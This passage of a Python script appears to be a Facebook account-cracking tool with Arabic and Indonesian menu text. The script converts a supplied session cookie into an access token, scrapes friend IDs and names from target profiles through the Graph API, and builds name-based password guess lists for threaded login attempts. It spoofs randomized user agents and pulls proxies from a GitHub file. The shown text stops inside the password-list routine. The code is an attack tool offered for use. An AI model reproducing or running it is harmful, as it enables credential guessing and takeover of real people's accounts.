(KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (iPad; CPU OS 17_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 DuckDuckGo/7 Safari/605.1.15', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/120.0.2210.86 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 Viewer/99.9.9009.89', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/120.0.2210.86 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 Unique/97.7.7286.70', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 Herring/95.1.1930.31', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0.1 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36 Config/92.2.2788.20', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 GLS/100.10.9979.100', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/120.0.2210.141 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0 OpenWave/94.4.4504.39', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/119.0.2151.78 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36 Agency/98.8.8175.80', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/121.0.2277.99 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/121.0.2277.107 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0 Config/91.2.2121.13', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Mobile/15E148 Safari/604.1 OPX/2.1.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/120.0.2210.126 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/118.0.2088.68 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36']
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox = requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text
	open('.prox.txt', 'w').write(prox)
except Exception as e:
	print(' ')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='11; Redmi Note 5A Lite)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko)'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Chrome/96.0.4664.45 Mobile Safari/537.36'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
	
	aa='Mozilla/5.0 (Linux; Android 12;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['M2101K6G'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 12;'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['RMX3396'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 13;'
	b=random.choice(['8.1.0','9','10','11','12','13'])
	c=random.choice(['RMX3396'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84;]'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	a='Mozilla/5.0 (Linux; Android 12;'
	b=random.choice(['9','10','11','12'])
	c=random.choice(['V2147'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]'
	uaku2=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	
	ugen.append(uaku2)
		
	
	aa='Mozilla/5.0 (Linux; Android 12;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['2201116PG'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/107.0.0.0 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 12;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['RMX3115 Build/SP1A.210812.016; wv'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 12;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SHARK KTUS-H0'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/107.0.0.0 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
		
	
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/605.1.15 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile/20A357 [FBAN/FBIOS;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.0;FBSS/3;FBID/phone;FBLC/en_Qaau_GB;FBOP/5]'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 11;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Infinix X688B'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/107.0.0.0 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
		
					
	aa='Mozilla/5.0 (Linux; Android 10;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Mi 9T Pro Build/QKQ1.190825.002; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
import os
try:
    import requests
except ImportError:
    print("\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall requests\n")
    os.system("pip install requests")

try:
    import rich
except ImportError:
    print("\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall rich\n")
    os.system("pip install rich")

import requests, sys, time, re, random
from concurrent.futures import ThreadPoolExecutor as Modol
from rich.progress import Progress, TextColumn
from bs4 import BeautifulSoup as par
from time import time as mek

M = '\x1b[1;91m' # MERAH
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING

def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.hossam.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
	except IOError:
		login_lagi334()





def login_lagi334():
	try:		
		os.system('clear')
		cookie=input(f' - Coki - حط كوكيز : ')
		open(".hossam.txt", "w").write(cookie)
		with requests.Session() as rsn:
			try:
				rsn.headers.update({
                    'Accept-Language': 'id,en;q=0.9',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                    'Referer': 'https://www.instagram.com/',
                    'Host': 'www.facebook.com',
                    'Sec-Fetch-Mode': 'cors',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Site': 'cross-site',
                    'Sec-Fetch-Dest': 'empty',
                    'Origin': 'https://www.instagram.com',
                    'Accept-Encoding': 'gzip, deflate',
                })
				response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&blueirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
				if '"access_token":' in str(response.headers):
					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
					open(".token.txt", "w").write(token)
					print('- Ok - اعد تشغيل الاداة')
				else:
					print("- No - كوكيز مو شغال ")
			except:
				print()
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .hossam.txt")
		exit()
def banner():
	pass		
def menu(sy2,sy3):
	
	ip = requests.get("https://api.ipify.org").text
	
	os.system('clear')
	print('''
               ███████╗  █████╗  ██╗ ██████╗
               ╚══███╔╝ ██╔══██╗ ██║ ██╔══██╗
                 ███╔╝  ███████║ ██║ ██║  ██║
                ███╔╝   ██╔══██║ ██║ ██║  ██║
               ███████╗ ██║  ██║ ██║ ██████╔╝
               ╚══════╝ ╚═╝  ╚═╝ ╚═╝ ╚═════╝
    ''')
	banner()
	kilop = '''
\033[1;31m༽\033[2;36m1\033[1;31m༼-\033[1;97m صيد من ايديات
	
\033[1;31m༽\033[2;36m2\033[1;31m༼- \033[1;97mصيد من ملف
	
\033[1;31m༽\033[2;36m0\033[1;31m༼- \033[1;97mمسح كوكيز
	'''
	zcn = nel(kilop,style='green')
	cetak(nel(zcn,title='قائمة المدفوع',style='red'))
	kilch = input('\n • اختار  : ')
	if kilch in ['1']:
		dump_massal()
	elif kilch in ['2']:
		TakeFile()	
	elif kilch in ['644']:
		TakeFile()	
	elif kilch in ['0']:
		oss()
def oss():
	import os
	os.system('rm -rf .token.txt')
	os.system('rm -rf .hossam.txt')
	print('Done')
	exit()
def TakeFile():
	
	try:
		
		jum = input('-ZAID • اسم او مسار الملف : ')
		for line in open(jum, 'r').readlines():
			id.append(line.strip())
		print('\n عدد الايديات : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
			print('[✘] No Connection  ')
			exit()
	except (KeyError,IOError):
			print('[✘] Id Is Not Public')
			time.sleep(3)

def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.hossam.txt','r').read()
	except IOError:
	    exit()
	try:
		kumpulkan = int(input(f'\033[2;36m\n\n-ZAID • ڪم ايدي تريد تخلي :  '))
	except ValueError:
	    exit()
	if kumpulkan<1 or kumpulkan>100:
	    exit()
	ses=requests.Session()
	bilangan = 0
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		Masukan = input(f'\033[1;32m\n-ZAID • الايديـ'+str(bilangan)+f' : ')
		uid.append(Masukan)
	for user in uid:
	    try:
	       head = ({"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36 EdgA/121.0.0.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/119.0.2151.78 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5; rv:123.0esr) Gecko/20100101 Firefox/123.0esr', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/117.0.2045.48 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"})
	       if len(id) == 0:
	           params = ({'access_token': token,'fields': "friends"})
	       else:
	           params = ({'access_token': token,'fields': "friends"})
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	    	exit()

	try:
		cetak(nel(f'\n-ZAID • الايديات المستخرجة '+str(len(id))))
		setting()
	except requests.exceptions.ConnectionError:
		print()
def setting():
	
	
	cetak(nel(' \033[1;31m༽\033[2;36m1༼\033[1;31m صيد مختلط '))
	hu = input('\n- Kil • اختار  ')
	if hu in ['01','1']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('>> PILIH YANG BENAR BANG ')
		exit()
#    print('>> 2. Mbasic ')
#    print('>> 3. Touch  ')
#    print('>> 4. Mtouch ')
	print('')
	hc = '1'
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['']:
		print('>> PILIH YANG BENAR BANG ')
		setting()
#	elif hc in ['2','02']:
#		method.append('free')
#	elif hc in ['3','03']:
#		method.append('touch')
	elif hc in ['4','04']:
		method.append('mbasic')
	else:
		method.append('mobile')
	print('')
	passwrd() 
def passwrd():
	
	
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append('ZZKGZZZKGZ')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append('112233445566')
					pwv.append('1122334455')
					pwv.append('1234512345')
					pwv.append('11223344@@')	
					pwv.append('11223344556677')
					pwv.append('00998877')
					pwv.append('ZZKGZZZKGZ')
					
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append('112233445566')
					pwv.append('1122334455')
					pwv.append('123412345')
					pwv.append('11223344@@')	
					pwv.append('11223344556677')
					pwv.append('00998877')
					pwv.append(nmf)
					pwv.append(frs+frs)
					pwv.append(frs+' '+frs)
					pwv.append(nmf)
					pwv.append('1q2w3e4r5t6y')
					pwv.append('1q2w3e4r5t')
					pwv.append('1122334455@@')
					pwv.append('07700770')
					pwv.append('07800780')
					pwv.append('20202020')
					pwv.append('20212021')
					pwv.append('20222022')
					pwv.append('20232023')
					pwv.append('19901990')
					pwv.append('19911991')
					pwv.append('19921992')
					pwv.append('19931993')
					pwv.append('19941994')
					pwv.append('19951995')
					pwv.append('19961996')
					pwv.append('19971997')
					pwv.append('19981998')
					pwv.append('19991999')
					pwv.append(nmf)
					pwv.append('1q2w3e4r5t6y')
					pwv.append('1q2w3e4r5t')
					pwv.append('1122334455@@')
					pwv.append('07700770')
					pwv.append('07800780')
					pwv.append('20202020')
					pwv.append('20212021')
					pwv.append('07800780')
					pwv.append('20232023')
					pwv.append('1234qwer')
					pwv.append('07890789')
					pwv.append('qqqqwwww')
					pwv.append('aaaassss')
					pwv.append('11qq22ww')
					pwv.append('q1w2e3r4t5')
					pwv.append('zzxxccvv')
					pwv.append('zzxxccvvbbnnmm')
					pwv.append('zzzzxxxx')
					pwv.append('ZZKGZZZKGZ')
					pwv.append('AliAli')
					pwv.append('AilAik123')
					pwv.append('١٢٣٤٥٦')
					pwv.append('١٢٣٤٥٦٧٨٩')
					pwv.append('1122334455@@')
					pwv.append('Aa123456')
					pwv.append('mmmmnnnn')
					pwv.append('nnnnmmmm')
					pwv.append('mmnnbbvv')
					pwv.append('zzzzxxxx')
					pwv.append('zzxxccvv')
					pwv.append('qqwweerr')
					pwv.append('12345@12345')
					pwv.append('123@123')
					pwv.append('1234512345')
					pwv.append('123412345')
					pwv.append('1234554321')
					pwv.append('00998877')
					pwv.append('123456123456')
